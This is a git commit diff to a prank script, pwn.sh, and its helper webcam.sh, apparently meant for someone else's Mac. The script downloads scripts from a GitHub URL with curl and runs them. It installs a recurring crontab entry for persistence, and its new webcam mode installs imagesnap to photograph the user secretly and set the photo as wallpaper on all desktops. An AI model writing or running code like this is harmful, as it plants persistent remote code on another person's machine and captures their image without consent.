9e9cef8475b430c08093a5d0641a1ce0a791c100
Josh Eversmann <josh.eversmann@gmail.com>
2016-09-13 14:38:43 -0500

    Add webcam mode and change background for all monitors

--- pwn.sh
+++ pwn.sh
@@ -2,11 +2,22 @@
 
 mkdir ~/.p-settings
 cd ~/.p-settings
-curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/pwny.sh
-curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/pwny.jpg
-chmod +x pwny.sh
-./pwny.sh
-cd -
 
-line="30 12 * * * ~/.p-settings/pwny.sh"
+if [[ $* == *--webcam* ]]
+then
+	echo "Webcam Mode"
+	brew install imagesnap
+	curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/webcam.sh
+	chmod +x webcam.sh
+	line="0 11-16 * * 1-4 ~/.p-settings/webcam.sh"
+else
+	echo "Pony Mode"
+	curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/pwny.sh
+	curl -O https://raw.githubusercontent.com/jeversmann/pwny/master/pwny.jpg
+	chmod +x pwny.sh
+	./pwny.sh
+	line="30 12 * * 1,2,4,5 ~/.p-settings/pwny.sh"
+fi
+
+cd -
 (crontab -l; echo "$line" ) | crontab -
--- webcam.sh
+++ webcam.sh
@@ -2,12 +2,15 @@
 
 DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 
+imagesnap $DIR/webcam.jpg
+sleep $(( ( RANDOM % 100 )  + 30 ))
+
 osascript <<EOF
 tell application "System Events"
     set desktopCount to count of desktops
     repeat with desktopNumber from 1 to desktopCount
         tell desktop desktopNumber
-            set picture to "$DIR/pwny.jpg"
+            set picture to "$DIR/webcam.jpg"
         end tell
     end repeat
 end tell
